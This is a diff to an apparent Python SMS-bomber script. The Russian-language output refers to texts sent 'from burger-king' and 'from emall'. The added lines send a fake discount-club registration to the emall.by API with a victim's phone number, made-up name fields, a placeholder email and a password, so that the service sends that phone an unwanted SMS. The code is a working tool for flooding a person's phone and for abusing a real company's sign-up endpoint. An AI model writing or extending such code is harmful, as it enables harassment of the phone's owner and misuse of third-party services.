@@ -129,3 +129,11 @@ if response.status_code == 200:
     print("Смс от burger-king отправлено!")
 else:
     print("Смс от burger-king не отправлено!")
+    
+    
+    
+response = requests.post('https://api.static.emall.by/rest/Json', json={"CRC":"","Packet":{"JWT":"null","MethodName":"DiscountClub.PutManDiscountShort","ServiceNumber":"C3546D1F-311F-4A6B-BFA5-DD52CDEEB373","Data":{"SourceName":"emall.by","LoginNameTypeId":2,"TargetId":"33,34,35","MobileOperatorId":"-1","Family":"-1","WhatSex":"-1","Phone2":"","Address1Name":"","Porch":"","Floorx":"","Address2Name":"","DateOfBirth":"","EMail":"proverkasite238@gmail.com","Phone1":f"{phone[1:]}","Name2":"Иванов","Name1":"Иван","Name3":"Иванович","Password":"123321123Eg","passwordRepeat":"123321123Eg"}}}, headers=headers1)
+if response.status_code == 200:
+    print("Смс от emall отправлено!")
+else:
+    print("Смс от emall не отправлено!")
